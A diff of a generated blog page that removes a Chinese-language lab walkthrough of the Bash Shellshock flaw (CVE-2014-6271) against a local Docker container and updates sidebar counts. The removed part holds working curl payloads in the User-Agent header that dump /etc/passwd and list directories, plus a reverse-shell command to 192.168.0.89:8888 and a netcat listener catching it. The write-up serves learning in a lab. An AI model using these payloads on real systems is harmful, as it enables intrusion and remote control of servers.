class="variable">$AUTH_TYPE</span></span><br><span class="line"><span class="built_in">echo</span> CONTENT_TYPE = <span class="variable">$CONTENT_TYPE</span></span><br><span class="line"><span class="built_in">echo</span> CONTENT_LENGTH = <span class="variable">$CONTENT_LENGTH</span></span><br></pre></td></tr></table></figure>
-
-<p>运行docker：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m0nst3r@digapis:~/study/VulApps/b/bash/shellshock1_CVE-2014-6271$ docker run -it -d -p 80:80 medicean/vulapps:b_bash_shellshock1 </span><br><span class="line">5f50262d8cbf791142822e857f32f4f8e33920ba2f6484c08e1e4f65749ca41f</span><br></pre></td></tr></table></figure>
-
-<p>访问本地地址：<br><img src="/images/1ebd60facde9478230d4b2e76342ac38e0f932c9.png" alt="Screenshot from 2018-03-29 12-16-38.png"></p>
-<p>测试命令如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">m0nst3r@digapis:/$ curl -A <span class="string">'() &#123; :; &#125;; a=`/bin/cat /etc/passwd`;echo $a'</span> <span class="string">"http://127.0.0.1/cgi-bin/poc.cgi"</span> -v</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET /cgi-bin/poc.cgi HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1</span><br><span class="line">&gt; User-Agent: () &#123; :; &#125;; a=`/bin/cat /etc/passwd`;<span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Thu, 29 Mar 2018 04:18:39 GMT</span><br><span class="line">&lt; Server: Apache/2.2.31 (Unix) mod_ssl/2.2.31 OpenSSL/1.0.1t DAV/2</span><br><span class="line">&lt; root: x:0:0:root:/root:/bin/bash</span><br><span class="line">&lt; daemon: x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">&lt; bin: x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">&lt; sys: x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">&lt; sync: x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">&lt; games: x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">&lt; man: x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">&lt; lp: x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">&lt; mail: x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">&lt; news: x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">&lt; uucp: x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">&lt; proxy: x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">&lt; www-data: x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">&lt; backup: x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">&lt; list: x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">&lt; irc: x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">&lt; gnats: x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">&lt; nobody: x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">&lt; systemd-timesync: x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">&lt; systemd-network: x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">&lt; systemd-resolve: x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">&lt; systemd-bus-proxy: x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;Bash ShellShock&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">SERVER_SIGNATURE=</span><br><span class="line">UNIQUE_ID=WrxpH6wRAAIAAAAODMgAAAAF</span><br><span class="line">SERVER_PORT=80</span><br><span class="line">HTTP_HOST=127.0.0.1</span><br><span class="line">DOCUMENT_ROOT=/usr/<span class="built_in">local</span>/apache2/htdocs</span><br><span class="line">SCRIPT_FILENAME=/usr/<span class="built_in">local</span>/apache2/cgi-bin/poc.cgi</span><br><span class="line">REQUEST_URI=/cgi-bin/poc.cgi</span><br><span class="line">SCRIPT_NAME=/cgi-bin/poc.cgi</span><br><span class="line">REMOTE_PORT=43562</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/apache2/bin:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">PWD=/usr/<span class="built_in">local</span>/apache2/cgi-bin</span><br><span class="line">SERVER_ADMIN=you@example.com</span><br><span class="line">HTTP_ACCEPT=*/*</span><br><span class="line">REMOTE_ADDR=172.17.0.1</span><br><span class="line">SHLVL=1</span><br><span class="line">SERVER_NAME=127.0.0.1</span><br><span class="line">SERVER_SOFTWARE=Apache/2.2.31 (Unix) mod_ssl/2.2.31 OpenSSL/1.0.1t DAV/2</span><br><span class="line">QUERY_STRING=</span><br><span class="line">SERVER_ADDR=172.17.0.2</span><br><span class="line">GATEWAY_INTERFACE=CGI/1.1</span><br><span class="line">SERVER_PROTOCOL=HTTP/1.1</span><br><span class="line">REQUEST_METHOD=GET</span><br><span class="line">HTTP_USER_AGENT=() &#123;  :</span><br><span class="line">&#125;</span><br><span class="line">_=/usr/bin/env</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">* Connection <span class="comment">#0 to host 127.0.0.1 left intact</span></span><br></pre></td></tr></table></figure>
-
-<p>命令中可改变<code>a=`/bin/cat/etc/passwd`;echo $a</code>为任意命令进行执行。</p>
-<p>另外一种命令执行方式：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">m0nst3r@digapis:/$ curl -A <span class="string">'() &#123; :; &#125;; echo ; echo $(/bin/ls -al /);'</span> <span class="string">"http://127.0.0.1/cgi-bin/poc.cgi"</span> -v</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET /cgi-bin/poc.cgi HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1</span><br><span class="line">&gt; User-Agent: () &#123; :; &#125;; <span class="built_in">echo</span> ; <span class="built_in">echo</span> $(/bin/ls -al /);</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Thu, 29 Mar 2018 04:21:50 GMT</span><br><span class="line">&lt; Server: Apache/2.2.31 (Unix) mod_ssl/2.2.31 OpenSSL/1.0.1t DAV/2</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Content-Type: text/plain</span><br><span class="line">&lt; </span><br><span class="line">total 76</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar 29 03:57 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar 29 03:57 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Mar 29 03:57 .dockerenv</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 30  2016 bin</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 30  2016 boot</span><br><span class="line">drwxr-xr-x   5 root root  360 Mar 29 03:57 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar 29 03:57 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 30  2016 home</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 30  2016 lib</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 lib64</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 media</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 mnt</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 opt</span><br><span class="line">dr-xr-xr-x 298 root root    0 Mar 29 03:57 proc</span><br><span class="line">drwx------   2 root root 4096 Jul 27  2016 root</span><br><span class="line">drwxr-xr-x   3 root root 4096 Jul 27  2016 run</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 sbin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 srv</span><br><span class="line">dr-xr-xr-x  13 root root    0 Mar 29 04:05 sys</span><br><span class="line">drwxrwxrwt   1 root root 4096 Mar 29 03:57 tmp</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 29  2016 usr</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 30  2016 var</span><br><span class="line">Content-type: text/html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;Bash ShellShock&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">SERVER_SIGNATURE=</span><br><span class="line">UNIQUE_ID=Wrxp3qwRAAIAAAAHAnkAAAAA</span><br><span class="line">SERVER_PORT=80</span><br><span class="line">HTTP_HOST=127.0.0.1</span><br><span class="line">DOCUMENT_ROOT=/usr/<span class="built_in">local</span>/apache2/htdocs</span><br><span class="line">SCRIPT_FILENAME=/usr/<span class="built_in">local</span>/apache2/cgi-bin/poc.cgi</span><br><span class="line">REQUEST_URI=/cgi-bin/poc.cgi</span><br><span class="line">SCRIPT_NAME=/cgi-bin/poc.cgi</span><br><span class="line">REMOTE_PORT=43590</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/apache2/bin:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">PWD=/usr/<span class="built_in">local</span>/apache2/cgi-bin</span><br><span class="line">SERVER_ADMIN=you@example.com</span><br><span class="line">HTTP_ACCEPT=*/*</span><br><span class="line">REMOTE_ADDR=172.17.0.1</span><br><span class="line">SHLVL=1</span><br><span class="line">SERVER_NAME=127.0.0.1</span><br><span class="line">SERVER_SOFTWARE=Apache/2.2.31 (Unix) mod_ssl/2.2.31 OpenSSL/1.0.1t DAV/2</span><br><span class="line">QUERY_STRING=</span><br><span class="line">SERVER_ADDR=172.17.0.2</span><br><span class="line">GATEWAY_INTERFACE=CGI/1.1</span><br><span class="line">SERVER_PROTOCOL=HTTP/1.1</span><br><span class="line">REQUEST_METHOD=GET</span><br><span class="line">HTTP_USER_AGENT=() &#123;  :</span><br><span class="line">&#125;</span><br><span class="line">_=/usr/bin/env</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">* Connection <span class="comment">#0 to host 127.0.0.1 left intact</span></span><br></pre></td></tr></table></figure>
-
-<p>反弹Shell的命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m0nst3r@digapis:/$ curl -A <span class="string">'() &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.89/8888 0&gt;&amp;1;'</span> <span class="string">"http://127.0.0.1/cgi-bin/poc.cgi"</span> -v</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET /cgi-bin/poc.cgi HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1</span><br><span class="line">&gt; User-Agent: () &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.89/8888 0&gt;&amp;1;</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">m0nst3r@digapis:~$ nc -lvp 8888</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8888)</span><br><span class="line">Connection from [172.17.0.2] port 8888 [tcp/*] accepted (family 2, sport 57046)</span><br><span class="line">bash-4.3$ ls</span><br><span class="line">ls</span><br><span class="line">poc.cgi</span><br><span class="line">printenv</span><br><span class="line"><span class="built_in">test</span>-cgi</span><br><span class="line">bash-4.3$</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1388,20 +1371,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-count">60</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-count">25</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
